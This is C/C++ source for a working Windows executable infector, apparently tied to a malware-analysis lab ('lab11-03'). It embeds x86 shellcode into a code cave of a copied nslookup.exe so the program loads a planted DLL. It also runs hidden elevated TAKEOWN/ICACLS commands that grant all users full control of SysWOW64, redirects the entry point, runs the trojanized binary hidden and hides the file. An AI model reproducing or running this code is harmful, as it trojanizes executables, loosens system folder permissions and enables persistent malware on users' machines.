#include <stdio.h>
#include <string.h>
#include <stdarg.h>
#include <Windows.h>
#include <fstream>
#include "header.h"

#define db(x) __asm _emit x

__declspec(naked) int ShellcodeStart(VOID) {
	__asm
	{
		pushad
		call	routine

		routine :
		pop		ebp
			sub		ebp, offset routine
			push	0								// stack adjustment
			lea		eax, [ebp + szText]				//stack adjustment
			push	eax								// stack adjustment
			lea		eax, [ebp + szText]		
			push	0								// stack adjustment
			push	eax								//dll path
			mov		eax, 0xAAAAAAAA
			call	eax								// Load Library

			popad
			push	0xAAAAAAAA						// OEP
			ret

			szText :
			db('C') db(':') db('\\') db('W') db('i') db('n') db('d') db('o') db('w') db('s') db('\\') db('S') db('y')
			db('s') db('W') db('O') db('W') db('6') db('4') db('\\') db('i') db('n') db('e') db('t') db('_') db('e') db('p')
			db('a') db('r') db('.') db('d') db('l') db('l') db(0)
	}
}
VOID ShellcodeEnd(VOID) {}

VOID CleanUp(HANDLE hFile, HANDLE hMapping, PUCHAR lpFile) {
	if (lpFile != NULL) UnmapViewOfFile(lpFile);
	if (hMapping != NULL) CloseHandle(hMapping);
	if (hFile != NULL) CloseHandle(hFile);
}

int main() {
	//get privileges to copy into sysWOW64 folder 
	ShellExecute(0, "runas", "cmd.exe", "TAKEOWN /F C:\\Windows\\SysWOW64 && ICACLS C:\\Windows\\SysWOW64 /grant users:f /T /q", 0, SW_HIDE);
	ShellExecute(0, "runas", "cmd.exe", "TAKEOWN /F C:\\Windows\\SysWOW64\\nslookup.exe && ICACLS C:\\Windows\\SysWOW64\\nslookup.exe /grant users:f /T /q", 0, SW_HIDE);
	CopyFile("C:\\Windows\\SysWOW64\\nslookup.exe", "nslookup.exe", 0);
	CopyFile("lab11-03.dll", "C:\\Windows\\SysWOW64\\inet_epar.dll", 0);
	const char * file = "nslookup.exe";
	Sleep(1);//time to copy file over
	HANDLE hFile = NULL;
	HANDLE hMapping = NULL;
	PUCHAR lpFile = NULL;

	//open file if it exists
	hFile = CreateFile(file, FILE_READ_ACCESS | FILE_WRITE_ACCESS,
		0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return 1;
	}

	DWORD dwFileSize = GetFileSize(hFile, NULL);

	//Map file
	hMapping = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, dwFileSize, NULL);
	if (hMapping == NULL) {
		CleanUp(hFile, hMapping, lpFile);
		return 1;
	}

	lpFile = (PUCHAR)MapViewOfFile(hMapping, FILE_MAP_READ | FILE_MAP_WRITE,
		0, 0, dwFileSize);
	if (lpFile == NULL) {
		CleanUp(hFile, hMapping, lpFile);
		return 1;
	}

	//check for a valid PE file
	if (VerifyDOS(GetDosHeader(lpFile)) == FALSE ||
		VerifyPE(GetPeHeader(lpFile)) == FALSE) {
		CleanUp(hFile, hMapping, lpFile);
		return 1;
	}

	PIMAGE_NT_HEADERS pinh = GetPeHeader(lpFile);
	PIMAGE_SECTION_HEADER pish = GetLastSectionHeader(lpFile);

	//find original entry point
	DWORD dwOEP = pinh->OptionalHeader.AddressOfEntryPoint +
		pinh->OptionalHeader.ImageBase;


	DWORD dwShellcodeSize = (DWORD)ShellcodeEnd - (DWORD)ShellcodeStart;
	//shellcode size = address of end - address of start of shellcode

	//find a code cave for insertion of shellcode
	DWORD dwCount = 0;
	DWORD dwPosition = 0;

	for (dwPosition = pish->PointerToRawData; dwPosition < dwFileSize; dwPosition++) {
		if (*(lpFile + dwPosition) == 0x00) {
			if (dwCount++ == dwShellcodeSize) {
				//backtrack to the beginning of the code cave
				dwPosition -= dwShellcodeSize;
				break;
			}
		}
		else {
			//reset counter if a large enough code cave couldn't be found
			dwCount = 0;
		}
	}

	if (dwCount == 0 || dwPosition == 0) {
		CleanUp(hFile, hMapping, lpFile);
		return 1;
	}

	//dynamically obtain address of function
	HMODULE hModule = GetModuleHandle("kernel32.dll");
	if (hModule == NULL) {
		CleanUp(hFile, hMapping, lpFile);
		return 1;
	}
	//get address of loadLibraryA
	//this should correspond to the address in the exe that will be infected
	LPVOID lpAddress = GetProcAddress(hModule, "LoadLibraryA");
	if (lpAddress == NULL) {
		FreeLibrary(hModule);
		CleanUp(hFile, hMapping, lpFile);
		return 1;
	}

	//create buffer for shellcode
	HANDLE hHeap = HeapCreate(0, 0, dwShellcodeSize);
	if (hHeap == NULL) {
		CleanUp(hFile, hMapping, lpFile);
		return 1;
	}

	LPVOID lpHeap = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwShellcodeSize);
	if (lpHeap == NULL) {
		HeapDestroy(hHeap);
		CleanUp(hFile, hMapping, lpFile);
		return 1;
	}

	//copy shellcode to buffer for placeholder modifications
	memcpy(lpHeap, ShellcodeStart, dwShellcodeSize);

	//modify function address offset
	DWORD dwIncrementor = 0;
	for (; dwIncrementor < dwShellcodeSize; dwIncrementor++) {
		if (*((LPDWORD)lpHeap + dwIncrementor) == 0xAAAAAAAA) {
			//injecting loadLibraryA address into placeholder in shellcode
			*((LPDWORD)lpHeap + dwIncrementor) = (DWORD)lpAddress;
			FreeLibrary(hModule);
			break;
		}
	}

	// modify OEP address offset
	for (; dwIncrementor < dwShellcodeSize; dwIncrementor++) {
		if (*((LPDWORD)lpHeap + dwIncrementor) == 0xAAAAAAAA) { 
			//injecting OEP into placeholder in shellcode		
			*((LPDWORD)lpHeap + dwIncrementor) = dwOEP;
			break;
		}
	}

	/*// shellcode dump
	Debug("Shellcode dump:");
	for (int i = 0; i < dwShellcodeSize; i++) {
		//printf("\\x%02x", *((PUCHAR)lpHeap + i));
	}
	//printf("\n\n");
	*/
	// copy the shellcode into code cave
	memcpy((PUCHAR)(lpFile + dwPosition), lpHeap, dwShellcodeSize);
	//Debug("Injected shellcode into file\n");
	HeapFree(hHeap, 0, lpHeap);
	HeapDestroy(hHeap);

	// update PE file info
	pish->Misc.VirtualSize += dwShellcodeSize;
	// make section executable
	pish->Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
	// set entry point
	// RVA = file offset + virtual offset - raw offset
	pinh->OptionalHeader.AddressOfEntryPoint = dwPosition + pish->VirtualAddress - pish->PointerToRawData;

	CleanUp(hFile, hMapping, lpFile);
	//infection complete
	//start infected program
	ShellExecute(0,0,file,0,0,SW_HIDE);

	//moving nslookup back to system32 has access issues despite takeown
	//so hide nslookup instead
	LPCSTR fileLPCSTR = "nslookup.exe"; // To avoid incompatibility
											  // in GetFileAttributes()
	int attr = GetFileAttributes(fileLPCSTR);
	if ((attr & FILE_ATTRIBUTE_HIDDEN) == 0) {
		SetFileAttributes(fileLPCSTR, attr | FILE_ATTRIBUTE_HIDDEN);
	}
	printf("Service Started");
	return 0;
}